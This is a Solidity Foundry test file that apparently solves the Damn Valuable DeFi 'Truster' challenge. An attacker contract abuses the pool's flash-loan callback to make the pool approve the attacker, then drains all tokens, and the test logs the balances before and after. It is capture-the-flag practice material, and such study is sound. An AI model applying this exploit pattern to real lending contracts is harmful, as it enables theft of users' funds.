// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { SafeTransferLib, ERC4626, ERC20 } from "solmate/src/tokens/ERC4626.sol"; 
import {TrusterLenderPool} from "../src/TrusterLenderPool.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {Test, console} from "forge-std/Test.sol";


contract Attacker{
    DamnValuableToken token;
    TrusterLenderPool pool;

    constructor(TrusterLenderPool _pool) {
        pool = _pool;
        token = pool.token();
    }


     /**
    * @param amount The amount to approve and withdram from the TrustterLenderPool.
    */
    function exploit(uint256 amount) public {
        bytes memory _data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

        (bool success,) = address(pool).call(abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)",  0, address(this), address( token), _data));
        require(success, "Flash loan call failed"); //call Approval function in the TrusterLenderPool::flashloan. 

        token.transferFrom(address(pool), address(this), amount);
                
    }
   
    receive() payable external {}
}

contract AttackReceiver {
    receive() payable external {}
}


contract TestTrusterCanBeDrained is Test {
    DamnValuableToken dvt;
    TrusterLenderPool pool;
    Attacker attack;
    AttackReceiver _receiverr;

    address player1 = makeAddr("player1");

    uint256 constant INITIAL_POOL_BALANCE = 1000000 ether;

    function setUp() public {

        dvt = new DamnValuableToken();
        pool = new TrusterLenderPool(dvt);
        attack = new Attacker(pool);
        _receiverr = new AttackReceiver();

        
        dvt.transfer(address(pool), INITIAL_POOL_BALANCE);

        //check the balance of tokens in pool
        assertEq(dvt.balanceOf(address(pool)), INITIAL_POOL_BALANCE);
        assertEq(dvt.balanceOf(address(attack)), 0);
    }

    function test__canDrainPool() public {
        console.log(dvt.balanceOf(address(pool))); //THE BALANCE OF DVT IN THE POOL BEFORE THE EXPLOIT
        console.log(dvt.balanceOf(address(attack))); //THE BALANCE OF DVT WITH THE ATTACKER AFTER THE EXPLOIT

         attack.exploit(INITIAL_POOL_BALANCE);

         console.log(dvt.balanceOf(address(pool))); //THE BALANCE OF DVT IN  THE POOL AFTER THE EXPLOIT
         console.log(dvt.balanceOf(address(attack))); //THE BALANCE OF DVT WITH THE ATTACKER AFTER THE EXPLOIT
    }
}
